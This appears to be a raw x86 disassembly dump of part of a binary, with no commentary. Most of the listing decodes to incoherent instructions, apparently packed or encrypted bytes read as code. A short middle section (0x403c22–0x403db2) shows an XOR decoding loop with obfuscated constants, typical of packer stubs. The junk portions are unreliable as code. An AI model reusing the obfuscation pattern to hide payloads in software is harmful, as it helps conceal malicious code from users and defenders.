  403ab5:	addr16 repnz push 0x441f7c65
  403abc:	(bad)  
  403abd:	mov    esi,0x13af3d63
  403ac2:	and    bl,ah
  403ac4:	fcmove st,st(2)
  403ac6:	mov    ebp,0xe6597445
  403acb:	push   ebp
  403acc:	cmp    BYTE PTR [eax-0x3d],al
  403acf:	jl     0x403ae7
  403ad1:	mov    DWORD PTR [edi+edi*8+0x6ea8c56],esi
  403ad8:	pop    eax
  403ad9:	in     eax,0xfa
  403adb:	or     bl,bh
  403add:	jmp    0x6951:0x6c509e77
  403ae4:	and    DWORD PTR [ebp+0x58bfd965],0x2b4fee9e
  403aee:	(bad)  
  403aef:	shl    DWORD PTR [eax+0x2c87982b],1
  403af5:	push   0xffffffda
  403af7:	xor    al,0x35
  403af9:	mov    eax,0x3a1f3f09
  403afe:	inc    ebx
  403aff:	pushf  
  403b00:	es gs dec ebx
  403b03:	mov    eax,0x1054043a
  403b08:	mov    dl,0x3a
  403b0a:	int3   
  403b0b:	mov    BYTE PTR [edi+esi*2-0x5],dh
  403b0f:	je     0x403b12
  403b11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b12:	mov    al,ah
  403b14:	sbb    dl,BYTE PTR [edi-0x44da56aa]
  403b1a:	or     BYTE PTR [esi+0x63a076e5],0x5c
  403b21:	xor    BYTE PTR [edi*2+0x13392a42],0x33
  403b29:	aaa    
  403b2a:	call   0x36f0d186
  403b2f:	pop    ecx
  403b30:	(bad)  
  403b31:	jle    0x403ac5
  403b33:	xchg   BYTE PTR [edi],bl
  403b35:	adc    BYTE PTR [edi-0xc],bl
  403b38:	not    DWORD PTR [eax-0x1eaf4236]
  403b3e:	cdq    
  403b3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403b40:	adc    DWORD PTR [esi+0x3551fdc2],edi
  403b46:	adc    al,0x3
  403b48:	iret   
  403b49:	pushf  
  403b4a:	stc    
  403b4b:	xor    DWORD PTR [edx+0x4292bc5e],eax
  403b51:	lea    esi,[edi+0x2f]
  403b54:	ret    
  403b55:	add    al,0x19
  403b57:	add    DWORD PTR [edi+0x2aa926de],0x3cfe3037
  403b61:	push   ecx
  403b62:	ja     0x403af7
  403b64:	jle    0x403b72
  403b66:	test   al,0xa1
  403b68:	fwait
  403b69:	lds    ecx,FWORD PTR [ebx]
  403b6b:	aam    0x16
  403b6d:	mov    ebp,0xc332615
  403b72:	ds (bad) 
  403b74:	jmp    0x26590b42
  403b79:	jg     0x403b2e
  403b7b:	mov    dl,0x95
  403b7d:	les    edi,FWORD PTR [ebx+0x23]
  403b80:	sub    BYTE PTR [edi-0x4d],al
  403b83:	inc    edi
  403b84:	call   FWORD PTR [ebp-0x56]
  403b87:	and    al,0xda
  403b89:	test   DWORD PTR [eax-0xa057743],ebp
  403b8f:	pop    ds
  403b90:	jnp    0x403b73
  403b92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b93:	ins    DWORD PTR es:[edi],dx
  403b94:	call   0x60f69e64
  403b99:	xchg   edi,ebp
  403b9b:	call   0x4a59:0x8953b37c
  403ba2:	ret    
  403ba3:	int    0x73
  403ba5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403ba6:	inc    edi
  403ba7:	rcr    BYTE PTR [eax+0x66f5447f],1
  403bad:	popa   
  403bae:	imul   edi,DWORD PTR [edi-0xa],0x21
  403bb2:	xchg   ebx,eax
  403bb3:	into   
  403bb4:	adc    eax,DWORD PTR [edi+0x6a]
  403bb7:	and    ebx,DWORD PTR [edx+edx*4]
  403bba:	test   DWORD PTR [ebx-0x7e],esp
  403bbd:	xchg   edi,eax
  403bbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403bbf:	mov    esi,0x62b384be
  403bc4:	imul   edi,DWORD PTR [ebx+edx*1],0x61fffd80
  403bcb:	mov    al,0x9c
  403bcd:	fs mov ah,0x7a
  403bd0:	inc    eax
  403bd1:	add    eax,0xff3f997
  403bd6:	repz inc esi
  403bd8:	pusha  
  403bd9:	dec    esi
  403bda:	daa    
  403bdb:	into   
  403bdc:	xlat   BYTE PTR ds:[ebx]
  403bdd:	cli    
  403bde:	mov    dl,0xf
  403be0:	mov    bl,0xab
  403be2:	sbb    BYTE PTR [esi],ch
  403be4:	frstor [edi+0x699cf8e6]
  403bea:	in     al,dx
  403beb:	dec    eax
  403bec:	jno    0x403c4f
  403bee:	stos   BYTE PTR es:[edi],al
  403bef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403bf0:	leave  
  403bf1:	push   esi
  403bf2:	adc    DWORD PTR [ecx+eax*1],edi
  403bf5:	into   
  403bf6:	call   0xa6b3fc2f
  403bfb:	jns    0x403b86
  403bfd:	jp     0x403bf5
  403bff:	jno    0x403bd3
  403c01:	push   ss
  403c02:	mov    esp,0xd346323c
  403c07:	push   ds
  403c08:	(bad)  
  403c09:	addr16 xor esi,esp
  403c0c:	lahf   
  403c0d:	inc    esp
  403c0e:	xor    ah,BYTE PTR [edi]
  403c10:	xchg   ebp,eax
  403c11:	nop
  403c12:	cs cdq 
  403c14:	inc    ebp
  403c15:	and    al,0x31
  403c17:	nop
  403c18:	dec    ebp
  403c19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c1a:	and    bh,al
  403c1c:	inc    ebp
  403c1d:	mov    esp,0xf89c85bc
  403c22:	mov    eax,DWORD PTR [ebp-0x38]
  403c25:	mov    edx,DWORD PTR [ebp-0x14]
  403c28:	xor    eax,esi
  403c2a:	add    eax,edi
  403c2c:	cmp    edx,eax
  403c2e:	je     0x40617c
  403c34:	mov    eax,DWORD PTR [ebp-0x20]
  403c37:	xor    eax,esi
  403c39:	mov    edx,0xffcd8d0b
  403c3e:	sub    edx,eax
  403c40:	add    edx,DWORD PTR [ebp-0x14]
  403c43:	mov    eax,DWORD PTR [ebp-0x20]
  403c46:	mov    ebx,DWORD PTR [ebp-0x10]
  403c49:	xor    eax,esi
  403c4b:	add    eax,edi
  403c4d:	imul   eax,ebx
  403c50:	cmp    eax,edx
  403c52:	ja     0x406179
  403c58:	mov    edx,DWORD PTR [ebp-0x10]
  403c5b:	mov    eax,DWORD PTR [ebp-0x14]
  403c5e:	mov    ebx,DWORD PTR [ebp-0x2c]
  403c61:	sub    eax,edx
  403c63:	xor    ebx,esi
  403c65:	xor    edx,edx
  403c67:	add    ebx,edi
  403c69:	div    ebx
  403c6b:	mov    DWORD PTR [ebp-0x8],eax
  403c6e:	mov    eax,DWORD PTR [ebp-0x44]
  403c71:	mov    edx,DWORD PTR [ebp-0x8]
  403c74:	xor    eax,esi
  403c76:	add    eax,edi
  403c78:	cmp    edx,eax
  403c7a:	jbe    0x403c8a
  403c80:	mov    eax,DWORD PTR [ebp-0x44]
  403c83:	xor    eax,esi
  403c85:	add    eax,edi
  403c87:	mov    DWORD PTR [ebp-0x8],eax
  403c8a:	mov    eax,DWORD PTR [ebp-0x2c]
  403c8d:	mov    edx,DWORD PTR [ebp-0x8]
  403c90:	xor    eax,esi
  403c92:	add    eax,edi
  403c94:	imul   eax,edx
  403c97:	mov    DWORD PTR [ebp-0x8],eax
  403c9a:	mov    eax,DWORD PTR [ebp-0x38]
  403c9d:	mov    edx,DWORD PTR [ebp-0x8]
  403ca0:	xor    eax,esi
  403ca2:	add    eax,edi
  403ca4:	cmp    edx,eax
  403ca6:	je     0x406162
  403cac:	mov    eax,DWORD PTR [ebp-0x8]
  403caf:	mov    DWORD PTR [ebp-0x18],eax
  403cb2:	mov    eax,DWORD PTR [ebp-0x10]
  403cb5:	add    eax,DWORD PTR [ebp-0x54]
  403cb8:	mov    DWORD PTR [ebp-0x1c],0xf89c85a5
  403cbf:	mov    DWORD PTR [ebp-0x8],eax
  403cc2:	mov    eax,0xf89c85a2
  403cc7:	mov    DWORD PTR [ebp-0x28],eax
  403cca:	mov    DWORD PTR [ebp-0x5c],0xf89c85a3
  403cd1:	mov    DWORD PTR [ebp-0x40],0xf89c85a0
  403cd8:	mov    DWORD PTR [ebp-0x30],eax
  403cdb:	mov    eax,DWORD PTR [ebp-0x1c]
  403cde:	xor    eax,esi
  403ce0:	add    eax,edi
  403ce2:	jmp    0x40611e
  403ce7:	mov    DWORD PTR [ebp-0x4c],0xf89c85b8
  403cee:	mov    DWORD PTR [ebp-0x50],0xf89c858f
  403cf5:	mov    eax,DWORD PTR [ebp-0x30]
  403cf8:	mov    edx,DWORD PTR [ebp-0xc]
  403cfb:	xor    eax,esi
  403cfd:	add    eax,edi
  403cff:	imul   eax,edx
  403d02:	mov    edx,DWORD PTR [ebp-0x8]
  403d05:	mov    al,BYTE PTR [eax+edx*1]
  403d08:	mov    BYTE PTR [ebp-0x1],al
  403d0b:	mov    eax,DWORD PTR [ebp-0x30]
  403d0e:	mov    edx,DWORD PTR [ebp-0xc]
  403d11:	xor    eax,esi
  403d13:	add    eax,edi
  403d15:	imul   eax,edx
  403d18:	mov    edx,DWORD PTR [ebp-0x5c]
  403d1b:	xor    edx,esi
  403d1d:	add    eax,edx
  403d1f:	mov    edx,DWORD PTR [ebp-0x8]
  403d22:	movzx  eax,BYTE PTR [eax+edx*1+0x3272f5]
  403d2a:	mov    edx,DWORD PTR [ebp-0x4c]
  403d2d:	xor    edx,esi
  403d2f:	lea    eax,[edx+eax*1+0x3272f5]
  403d36:	movzx  edx,BYTE PTR [ebp-0x1]
  403d3a:	xor    edx,eax
  403d3c:	mov    BYTE PTR [ebp-0x1],dl
  403d3f:	mov    al,BYTE PTR [ebp-0x1]
  403d42:	mov    edx,DWORD PTR [ebp-0x30]
  403d45:	mov    ebx,DWORD PTR [ebp-0xc]
  403d48:	xor    edx,esi
  403d4a:	add    edx,edi
  403d4c:	imul   edx,ebx
  403d4f:	mov    ebx,DWORD PTR [ebp-0x8]
  403d52:	mov    BYTE PTR [edx+ebx*1],al
  403d55:	mov    eax,DWORD PTR [ebp-0x30]
  403d58:	mov    edx,DWORD PTR [ebp-0xc]
  403d5b:	xor    eax,esi
  403d5d:	add    eax,edi
  403d5f:	imul   eax,edx
  403d62:	mov    edx,DWORD PTR [ebp-0x8]
  403d65:	mov    al,BYTE PTR [eax+edx*1]
  403d68:	mov    BYTE PTR [ebp-0x1],al
  403d6b:	mov    eax,DWORD PTR [ebp-0x30]
  403d6e:	mov    edx,DWORD PTR [ebp-0xc]
  403d71:	xor    eax,esi
  403d73:	add    eax,edi
  403d75:	imul   eax,edx
  403d78:	mov    edx,DWORD PTR [ebp-0x28]
  403d7b:	xor    edx,esi
  403d7d:	add    eax,edx
  403d7f:	mov    edx,DWORD PTR [ebp-0x8]
  403d82:	movzx  eax,BYTE PTR [eax+edx*1+0x3272f5]
  403d8a:	mov    edx,DWORD PTR [ebp-0x50]
  403d8d:	xor    edx,esi
  403d8f:	lea    eax,[edx+eax*1+0x3272f5]
  403d96:	movzx  edx,BYTE PTR [ebp-0x1]
  403d9a:	xor    edx,eax
  403d9c:	mov    BYTE PTR [ebp-0x1],dl
  403d9f:	mov    al,BYTE PTR [ebp-0x1]
  403da2:	mov    edx,DWORD PTR [ebp-0x30]
  403da5:	mov    ebx,DWORD PTR [ebp-0xc]
  403da8:	xor    edx,esi
  403daa:	add    edx,edi
  403dac:	imul   edx,ebx
  403daf:	mov    ebx,DWORD PTR [ebp-0x8]
  403db2:	jmp    0x406107
  403db7:	dec    ebx
  403db8:	inc    eax
  403db9:	sub    eax,0xc4820296
  403dbe:	scas   al,BYTE PTR es:[edi]
  403dbf:	push   0x68dd8915
  403dc4:	add    edi,DWORD PTR ds:0x835e4b09
  403dca:	or     DWORD PTR [ebx+0x5e],0xffffff83
  403dce:	sbb    DWORD PTR [edi+0x5c],0xffffff86
  403dd2:	cmp    esp,DWORD PTR [ecx]
  403dd4:	jbe    0x403e53
  403dd6:	daa    
  403dd7:	xor    eax,0x65ab6597
  403ddc:	inc    ebp
  403ddd:	popf   
  403dde:	push   ebx
  403ddf:	mov    ch,0x2c
  403de1:	and    DWORD PTR [edi-0x7c9cfa51],ebx
  403de7:	or     DWORD PTR [edi],eax
  403de9:	or     ch,bl
  403deb:	(bad)  
  403dec:	push   esi
  403ded:	jle    0x403d81
  403def:	jae    0x403d84
  403df1:	pop    ecx
  403df2:	push   esi
  403df3:	adc    al,0xac
  403df5:	daa    
  403df6:	les    esp,FWORD PTR ds:0x90a87103
  403dfc:	lea    esp,[eax+ebx*8]
  403dff:	sub    BYTE PTR [ebx],bh
  403e01:	and    BYTE PTR [eax+0x1f],cl
  403e04:	sti    
  403e05:	sub    ecx,DWORD PTR [edx-0x2]
  403e08:	not    DWORD PTR [ebp-0x86dc7ff]
  403e0e:	mov    ecx,0x8d65cdb9
  403e13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e14:	xor    eax,0xc65ac84d
  403e19:	cmp    eax,DWORD PTR [edi]
  403e1b:	mov    dl,dl
  403e1d:	jg     0x403df3
  403e1f:	push   0xd7fc870c
  403e24:	or     BYTE PTR [edx-0x49cdace7],ch
  403e2a:	jg     0x403dd2
  403e2c:	(bad)  
  403e2f:	lock push esp
  403e31:	cmp    BYTE PTR [ebx+0x68],ch
  403e34:	inc    edx
  403e35:	lds    ebp,FWORD PTR fs:[edi+0x623c7047]
  403e3c:	xchg   ecx,eax
  403e3d:	mov    bh,0xba
  403e3f:	xchg   ecx,eax
  403e40:	mov    esi,0xc4626ad4
  403e45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e46:	mov    ebp,0x88c642b5
  403e4b:	push   edi
  403e4c:	stos   BYTE PTR es:[edi],al
  403e4d:	imul   ebx,edx,0x4de53d88
  403e53:	mov    ah,bh
  403e55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403e56:	adc    ebx,DWORD PTR [ebx+0x2c]
  403e59:	ss pop esi
  403e5b:	sub    DWORD PTR [edx-0x5b],0xed111c41
  403e62:	mov    dl,0x85
  403e64:	mov    edi,0x2bb6e323
  403e69:	stos   BYTE PTR es:[di],al
  403e6b:	xchg   esp,eax
  403e6c:	xchg   ebx,eax
  403e6d:	pop    esp
  403e6e:	ficomp WORD PTR [ecx+0x59ddc78d]
  403e74:	test   DWORD PTR [ecx],eax
  403e76:	scas   al,BYTE PTR es:[edi]
  403e77:	sbb    bl,BYTE PTR [eax]
  403e79:	(bad)  
  403e7a:	jge    0x403e68
  403e7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e7d:	and    eax,eax
  403e7f:	sub    eax,0x632f8480
  403e84:	dec    esp
  403e85:	xchg   esi,eax
  403e86:	out    dx,eax
  403e87:	aam    0x1
  403e89:	cmp    BYTE PTR [eax-0x50],bl
  403e8c:	cmp    ebp,ecx
  403e8e:	mov    cs,WORD PTR [ecx+edi*1+0x7b1d1074]
  403e95:	or     ecx,esi
  403e97:	push   ebx
  403e98:	addr16 (bad) 
  403e9a:	fstp   DWORD PTR [eax]
  403e9c:	and    BYTE PTR [ebp+0x6fbef49b],al
  403ea2:	je     0x403ec7
  403ea4:	mov    bl,0x23
  403ea6:	cld    
  403ea7:	mov    ch,0x2f
  403ea9:	aam    0x98
  403eab:	out    0x99,eax
  403ead:	(bad)
  403eb1:	or     DWORD PTR [ebp-0x1a],edx
  403eb4:	sub    ch,BYTE PTR [edi+0x12]
  403eb7:	pop    ds
  403eb8:	aad    0x99
  403eba:	mov    WORD PTR [ebp+eax*8+0x122cdd4a],ss
  403ec1:	inc    edi
  403ec2:	gs jg  0x403ef0
  403ec5:	pop    ecx
  403ec6:	jne    0x403e53
  403ec8:	xor    al,0x41
  403eca:	add    eax,0x8d3d3357
  403ecf:	aas    
  403ed0:	fcomp  DWORD PTR [eax+0x9]
  403ed3:	jb     0x403f19
  403ed5:	add    DWORD PTR [ebx],edx
  403ed7:	push   edx
  403ed8:	nop
  403ed9:	loope  0x403ee1
  403edb:	scas   eax,DWORD PTR es:[edi]
  403edc:	add    al,BYTE PTR [esi]
  403ede:	mov    ds:0x907e02b6,al
  403ee3:	sti    
  403ee4:	inc    ebp
  403ee5:	xchg   DWORD PTR [esi+0x3a97433c],ebp
  403eeb:	enter  0xc2e3,0x1d
  403eef:	cdq    
  403ef0:	adc    BYTE PTR [eax],dl
  403ef2:	inc    esp
  403ef3:	or     al,0x76
  403ef5:	cmc    
  403ef6:	cmp    eax,0xef070297
  403efb:	dec    ebp
  403efc:	dec    ebx
  403efd:	or     ebx,DWORD PTR [edi*1+0x11531baa]
  403f04:	and    eax,0xba33c3e2
  403f09:	test   ecx,ebx
  403f0b:	push   esi
  403f0c:	xor    bh,BYTE PTR [eax+0x4e1c93aa]
  403f12:	xchg   ebx,eax
  403f13:	rcl    DWORD PTR [ecx-0x14],cl
  403f16:	fcomip st,st(4)
  403f18:	ds into 
  403f1a:	mov    al,0x20
  403f1c:	mov    ebx,0x4ce6b6db
  403f21:	iret   
  403f22:	int3   
  403f23:	cmp    DWORD PTR [eax-0x488208f],ecx
  403f29:	and    DWORD PTR [ebx+0x68],esi
  403f2c:	fistp  DWORD PTR [edi-0x7df7e05f]
  403f32:	repnz aaa 
  403f34:	(bad)  
  403f35:	mov    cl,0x18
  403f37:	retf   0xa3d9
  403f3a:	xchg   DWORD PTR [ebp+0x1cdc336f],edx
  403f40:	inc    ebp
  403f41:	inc    esi
  403f42:	cmp    DWORD PTR [edx-0x1b7badb4],esp
  403f48:	cdq    
  403f49:	mov    eax,ds:0xfb79df13
  403f4e:	xor    ebp,DWORD PTR [ebp-0x50874624]
  403f54:	das    
  403f55:	xchg   esp,eax
  403f56:	xlat   BYTE PTR ds:[ebx]
  403f57:	inc    esp
  403f58:	mov    edx,0x11fb7ee8
  403f5d:	add    al,0x9
  403f5f:	dec    esp
  403f60:	mov    ch,0xda
  403f62:	test   eax,0x14b121f6
  403f67:	dec    ebp
  403f68:	mov    ebp,DWORD PTR es:[eax-0x611e4bdc]
  403f6f:	push   es
  403f70:	adc    eax,0x75d92d15
  403f75:	mov    dl,0x4c
  403f77:	gs clc 
  403f79:	sbb    DWORD PTR ds:0xb6c30d3a,ecx
  403f7f:	stc    
  403f80:	add    DWORD PTR [ebx],eax
  403f82:	clc    
  403f83:	cmp    eax,0xa425b99b
  403f88:	jmp    0xa6196604
  403f8d:	mov    DWORD PTR [edi+eax*4+0xccf2f0d],ebp
  403f94:	jecxz  0x403fa9
  403f96:	out    0xf5,eax
  403f98:	inc    esi
  403f99:	xchg   edx,eax
  403f9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f9b:	adc    eax,esp
  403f9d:	or     ch,BYTE PTR [ebp-0x518d2a18]
  403fa3:	xchg   ebx,eax
  403fa4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403fa5:	enter  0xeee6,0x90
  403fa9:	in     eax,dx
  403faa:	dec    esp
  403fab:	shr    DWORD PTR [ecx-0x3be890ce],1
  403fb1:	adc    al,0xee
  403fb3:	jno    0x403f3d
  403fb5:	scas   al,BYTE PTR es:[edi]
  403fb6:	repnz fsub QWORD PTR [ebp-0x5e]
  403fba:	retf   
  403fbb:	clc    
  403fbc:	pushf  
  403fbd:	or     BYTE PTR [ebx],dh
  403fbf:	push   cs
  403fc0:	mov    eax,ds:0x48c8bd7c
  403fc5:	and    BYTE PTR [ebx+0x3e],ch
  403fc8:	sub    edx,eax
  403fca:	lds    edx,FWORD PTR [eax+0x588b88fe]
  403fd0:	push   es
  403fd1:	call   0x2990:0x32b9be62
  403fd8:	ror    ah,1
  403fda:	or     eax,0xce3171b
  403fdf:	shr    BYTE PTR [ebp-0x5b],1
  403fe2:	jg     0x403fd4
  403fe4:	add    eax,0x8b9490a
  403fe9:	sbb    edi,esp
  403feb:	shl    DWORD PTR fs:[ecx-0x23],0x67
  403ff0:	les    esi,FWORD PTR [ecx+edx*2+0xf]
  403ff4:	or     eax,0xf7111181
  403ff9:	push   es
  403ffa:	and    DWORD PTR ds:0x2843cf0d,edi
  404000:	popf   
  404001:	or     ebp,DWORD PTR [ebx+0xa6260e8]
  404007:	push   ss
  404008:	lods   al,BYTE PTR ds:[esi]
  404009:	mov    ecx,0x7cefe3fa
  40400e:	push   0xc1c70da5
  404013:	mov    eax,0x533bb157
  404018:	sbb    eax,0x201fc696
  40401d:	add    eax,0xe5be57f1
  404022:	sahf   
  404023:	add    al,0x56
  404025:	enter  0xa977,0xe5
  404029:	fimul  WORD PTR [edx+0x7fec283]
  40402f:	sti    
  404030:	mov    WORD PTR [edi-0x1],?
  404033:	adc    BYTE PTR [eax-0x34],ah
  404036:	and    DWORD PTR [ebx+ecx*1+0x6860d096],ebp
  40403d:	aam    0xba
  40403f:	out    dx,al
  404040:	sbb    DWORD PTR [ebp-0x5be1f4ff],edi
  404046:	fcmovne st,st(4)
  404048:	dec    ebp
  404049:	sub    ah,BYTE PTR ds:0x889a1e4
  40404f:	mov    eax,ds:0x64d7457a
  404054:	and    DWORD PTR [ebx+0x36a4916b],0xb02f1c0b
  40405e:	pop    esp
  40405f:	loopne 0x4040de
  404061:	icebp  
  404062:	push   edi
  404063:	jmp    0xc655d96f
  404068:	mov    DWORD PTR [edx+ebp*2],ebx
  40406b:	into   
  40406c:	mov    edi,0x649fd747
  404071:	pop    esp
  404072:	daa    
  404073:	cmc    
  404074:	aaa    
  404075:	sbb    eax,0x5220f2bf
  40407a:	xor    ebp,DWORD PTR [eax+0x63e5e9c8]
  404080:	or     al,0x2e
  404082:	xchg   edi,eax
  404083:	pop    ebp
  404084:	adc    ah,BYTE PTR [ebp+0x1]
  404087:	daa    
  404088:	shl    DWORD PTR [esp+esi*2-0x5e7d9fe0],cl
  40408f:	sub    BYTE PTR [ebp+ebp*2-0x41],cl
  404093:	outs   dx,DWORD PTR ds:[esi]
  404094:	xchg   esp,eax
  404095:	mul    BYTE PTR [eax]
  404097:	sub    eax,DWORD PTR [edi]
  404099:	fisub  DWORD PTR [eax+0x64]
  40409c:	push   ebx
  40409d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40409e:	mov    bl,0x49
  4040a0:	jle    0x4040e8
  4040a2:	xchg   BYTE PTR cs:[ebx+0x19694a4c],dh
  4040a9:	leave  
  4040aa:	fiadd  DWORD PTR [edx-0x27]
  4040ad:	arpl   WORD PTR [ebx],cx
  4040af:	xchg   dl,bh
  4040b1:	inc    esp
  4040b2:	fld    QWORD PTR [edx+eiz*2]
  4040b5:	pop    ecx
  4040b6:	push   es
  4040b7:	push   esi
  4040b8:	and    BYTE PTR [esi-0xf89b8c7],bh
  4040be:	cmp    ah,ch
  4040c0:	adc    cl,BYTE PTR [edi+0x48223d56]
  4040c6:	(bad)  
  4040c7:	cdq    
  4040c8:	mov    BYTE PTR [ebp-0x5d08165b],ch
  4040ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4040cf:	inc    ebp
  4040d0:	adc    eax,0xed0c3cfa
  4040d5:	adc    BYTE PTR [ebx],0x88
  4040d8:	call   FWORD PTR [edi-0x52]
  4040db:	jecxz  0x404067
  4040dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4040de:	xchg   esp,eax
  4040df:	fwait
  4040e0:	cdq    
  4040e1:	xchg   ebx,eax
  4040e2:	arpl   WORD PTR [edi],bx
  4040e4:	mov    al,0x99
  4040e6:	inc    esi
  4040e7:	cmp    eax,0xef33791b
  4040ec:	ins    BYTE PTR es:[edi],dx
  4040ed:	ret    
  4040ee:	and    BYTE PTR [ecx],bh
  4040f0:	xor    DWORD PTR [ebp-0x60db04a],edi
  4040f6:	sbb    DWORD PTR [ebx],0xffffffa9
  4040f9:	iret   
  4040fa:	gs mov edx,0xe0241fe3
  404100:	push   ss
  404101:	outs   dx,DWORD PTR ds:[esi]
  404102:	pushf  
  404103:	xchg   ecx,eax
  404104:	add    al,0x2f
  404106:	test   cl,dl
  404108:	sti    
  404109:	sbb    ch,bl
  40410b:	rol    bl,0x19
  40410e:	in     al,dx
  40410f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404110:	(bad)  [edi-0x157b6018]
  404116:	in     eax,dx
  404117:	dec    edx
  404118:	push   edx
  404119:	lea    esp,[eax]
  40411b:	dec    esp
  40411c:	dec    edi
  40411d:	jecxz  0x4040a7
  40411f:	pop    edx
  404120:	push   esi
  404121:	aad    0x97
  404123:	xchg   esi,eax
  404124:	mov    edx,0xe9729c15
  404129:	lea    edx,[esi]
  40412b:	sbb    eax,0x259f65a3
  404130:	(bad)  
  404131:	daa    
  404132:	push   ds
  404133:	push   ebx
  404134:	cs clc 
  404136:	sbb    eax,0xa865d952
  40413b:	addr16 daa 
  40413d:	dec    ebx
  40413e:	mov    eax,0x2e5546f1
  404143:	xchg   BYTE PTR [ebx],ch
  404145:	jb     0x40418d
  404147:	and    eax,0x20af9708
  40414c:	enter  0xffb4,0x81
  404150:	fwait
  404151:	add    DWORD PTR [ecx-0x17],edx
  404154:	push   cs
  404155:	ja     0x4041ab
  404157:	das    
  404158:	cld    
  404159:	js     0x404126
  40415b:	ret    
  40415c:	mov    dh,0xbb
  40415e:	jo     0x404199
  404160:	stc    
  404161:	loope  0x40419b
  404163:	clc    
  404164:	jmp    0x4040fd
  404166:	xchg   edx,ebx
  404168:	dec    eax
  404169:	(bad)  
  40416a:	and    eax,0x3ba7d4a0
  40416f:	pop    esp
  404170:	imul   edi,DWORD PTR [edi],0x2f3a3023
  404176:	inc    edi
  404177:	lods   eax,DWORD PTR ds:[esi]
  404178:	dec    ebp
  404179:	shr    BYTE PTR [ebp+ecx*2+0x61f860b0],0x21
  404181:	sbb    bl,BYTE PTR [edx]
  404183:	jno    0x4041a1
  404185:	js     0x404158
  404187:	push   edi
  404188:	(bad)  
  404189:	bound  esp,QWORD PTR [ecx-0x31]
  40418c:	pusha  
  40418d:	pop    eax
  40418e:	sub    ch,dl
  404190:	mov    edx,0xc9ac4c17
  404195:	or     eax,0x869da18e
  40419a:	mov    bh,0x52
  40419c:	pop    es
  40419d:	push   es
  40419e:	xor    DWORD PTR [esp+esi*2+0x63],edi
  4041a2:	jecxz  0x4041d8
  4041a4:	and    eax,0x7588d76
  4041a9:	and    eax,0xb29286ed
  4041ae:	cmp    eax,0x127b4877
  4041b3:	xor    DWORD PTR [ecx+esi*4-0x4],edi
  4041b7:	and    eax,0x48d1a89
  4041bc:	mov    edx,0x84e7969f
  4041c1:	sub    DWORD PTR ds:0x592de424,esp
  4041c7:	sbb    BYTE PTR [ebx],cl
  4041c9:	xchg   BYTE PTR [esi-0x22],ah
  4041cc:	mov    ds:0x4721157e,al
  4041d1:	mov    BYTE PTR ds:0x5095876a,al
  4041d7:	xchg   ebx,eax
  4041d8:	cs push ss
  4041da:	in     al,0x89
  4041dc:	fidivr DWORD PTR [esi+0x6320c9c9]
  4041e2:	adc    ebp,DWORD PTR [ecx+0x31]
  4041e5:	push   DWORD PTR [edx+0x6a40209]
  4041eb:	mov    dl,0x55
  4041ed:	(bad)  
  4041ee:	and    edi,DWORD PTR gs:[ebp+0x3d]
  4041f2:	out    0x59,eax
  4041f4:	daa    
  4041f5:	xor    al,0x6f
  4041f7:	dec    edx
  4041f8:	inc    esi
  4041f9:	mov    BYTE PTR gs:[eax-0x45c1cc31],al
  404200:	arpl   WORD PTR [edi-0x47],si
  404203:	dec    ecx
  404204:	call   0xbeeb:0x2f8c08e1
  40420b:	(bad)  
  40420c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40420d:	mov    ebp,0x28dafa7d
  404212:	retf   
  404213:	ins    BYTE PTR es:[edi],dx
  404214:	pop    DWORD PTR [ecx]
  404216:	push   ebp
  404217:	push   ebx
  404218:	add    BYTE PTR [esi],0x7a
  40421b:	fstp   TBYTE PTR [ebp-0x22]
  40421e:	mov    ah,0xf0
  404220:	sbb    eax,0x81410557
  404225:	sbb    eax,0xcd556bda
  40422a:	gs jg  0x4041c1
  40422d:	or     eax,0xfca1a22d
  404232:	retf   
  404233:	rcr    al,cl
  404235:	jg     0x40422c
  404237:	shl    DWORD PTR [edx+edi*1],0x1f
  40423b:	out    dx,al
  40423c:	sub    DWORD PTR [ebx-0x45f306b6],0xf09a2b59
  404246:	add    ch,BYTE PTR [ebp+0x35e0622c]
  40424c:	popf   
  40424d:	jne    0x404232
  40424f:	hlt    
  404250:	scas   al,BYTE PTR es:[edi]
  404251:	int    0xf3
  404253:	jl     0x40423a
  404255:	(bad)  
  404256:	mov    bh,0x43
  404258:	adc    ch,bl
  40425a:	lods   al,BYTE PTR ds:[esi]
  40425b:	mov    esi,0xc7ab82e8
  404260:	mov    ebx,0x18f0cae0
  404265:	fisub  WORD PTR [edx+esi*1]
  404268:	mov    esi,eax
  40426a:	sub    al,0x56
  40426c:	or     eax,0x66d26a5a
  404271:	(bad)  
  404272:	lods   al,BYTE PTR ds:[esi]
  404273:	mov    dl,al
  404275:	popf   
  404276:	sbb    eax,0x780e1e75
  40427b:	xchg   esp,eax
  40427c:	adc    ch,ch
  40427e:	sar    cl,cl
  404280:	inc    esi
  404281:	addr16 push ebx
  404283:	cmc    
  404284:	aam    0x39
  404286:	int    0x7d
  404288:	pop    eax
  404289:	mov    bh,0x54
  40428b:	adc    bh,cl
  40428d:	push   edi
  40428e:	jbe    0x40430e
  404290:	ja     0x40430a
  404292:	mov    ch,0x35
  404294:	jns    0x404286
  404296:	xor    eax,0xf6874ede
  40429b:	or     ebx,esp
  40429d:	add    esi,ebp
  40429f:	(bad)  
  4042a0:	clc    
  4042a1:	or     eax,0xcbb6deb7
  4042a6:	int    0x9e
  4042a8:	jmp    0x4042b3
  4042aa:	xchg   esp,eax
  4042ab:	adc    DWORD PTR [eax],esi
  4042ad:	push   eax
  4042ae:	push   ebx
